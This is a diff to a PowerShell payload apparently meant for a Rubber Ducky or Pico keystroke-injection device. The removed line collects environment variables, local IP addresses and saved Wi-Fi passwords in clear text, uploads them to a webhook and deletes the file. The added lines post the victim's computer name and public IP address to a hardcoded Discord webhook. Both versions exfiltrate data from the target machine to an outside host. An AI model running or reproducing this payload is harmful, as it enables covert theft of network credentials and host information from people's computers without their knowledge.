@@ -1,1 +1,7 @@
-$url="$dc";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Stats from Ducky/Pico"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit
+$url = "https://discord.com/api/webhooks/1060451832108949596/-doca_q-YfvU_TZ1feEwZ3QuatUBCPnaQx1UW95kVkQ3_7QpmiidEzXoceBJ6oHr-KCZ";
+$AddressUsingIpify = (Invoke-WebRequest -uri "https://api.ipify.org/").Content;
+$AddressUsingIpInfo = Invoke-WebRequest -uri "https://ipinfo.io/ip";
+$AddressUsingIfconfig = Invoke-WebRequest -uri "https://ifconfig.me/ip";
+$Body=@{ content = "Computer Name:\n```$env:computername```\nIPv4 Address Using Ipify API:\n```$AddressUsingIpify```\nIPv4 Address Using IPInfo API:\n```$AddressUsingIpify```\nIPv4 Address Using Ifconfig API:\n```$AddressUsingIfconfig```"};
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
+exit
